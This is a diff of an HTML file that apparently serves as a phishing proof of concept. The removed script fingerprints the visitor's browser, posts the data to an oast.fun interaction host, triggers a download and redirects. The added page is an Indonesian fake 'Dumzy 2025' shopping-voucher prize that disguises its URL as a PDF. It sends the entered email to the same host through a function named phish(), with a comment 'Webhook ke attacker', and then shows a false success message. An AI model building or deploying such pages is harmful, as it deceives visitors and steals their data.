@@ -1,33 +1,57 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Undian Doorprize Dumzy</title>
+  <style>
+    body { font-family: sans-serif; background: #fff8e1; text-align: center; padding: 40px; }
+    .popup { border: 2px solid #4caf50; background: #fff; padding: 30px; box-shadow: 0 0 20px rgba(0,0,0,0.1); }
+    input[type="email"], button {
+      font-size: 18px;
+      padding: 12px;
+      width: 80%;
+      margin: 10px 0;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #4caf50;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
 <body>
-<script>
-  // 1. Fingerprint & send
-  const data = {
-    ua: navigator.userAgent,
-    screen: screen.width + 'x' + screen.height,
-    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    ref: document.referrer
-  };
+  <div class="popup">
+    <h1>🎉 Voucher Dumzy 2025 🎉</h1>
+    <p>Selamat! Anda menerima <strong>voucher belanja Rp500.000</strong>.</p>
+    <p>Untuk mengklaim dan menyimpan ke akun Anda, silakan isi email Anda di bawah ini:</p>
+    <form id="claimForm" onsubmit="phish(event)">
+      <input type="email" id="email" required placeholder="Masukkan email Anda" /><br>
+      <button type="submit">Klaim Voucher</button>
+    </form>
+    <div id="result" style="display:none; margin-top:20px;"></div>
+  </div>
 
-  fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(data)
-  });
+  <script>
+    // Ubah URL agar tampak seolah membuka file PDF
+    history.pushState({}, '', '/reward/Voucher_Dumzy_2025.pdf');
 
-  // 2. Auto download
-  const a = document.createElement('a');
-  a.href = 'data:text/html,clickjacked!';
-  a.download = 'win.html';
-  a.style.display = 'none';
-  document.body.appendChild(a);
-  a.click();
+    function phish(e) {
+      e.preventDefault();
+      const email = document.getElementById('email').value;
 
-  // 3. Redirect
-  setTimeout(() => {
-    location.replace("https://www.google.com");
-  }, 1500);
-</script>
+      // Webhook ke attacker
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/log?email=' + encodeURIComponent(email));
+
+      // Feedback palsu
+      document.getElementById('claimForm').style.display = 'none';
+      document.getElementById('result').style.display = 'block';
+      document.getElementById('result').innerHTML = `
+        <h3>✅ Voucher berhasil diklaim!</h3>
+        <p>Voucher Anda akan dikirim ke <b>${email}</b> dalam 1x24 jam.</p>
+      `;
+    }
+  </script>
 </body>
 </html>
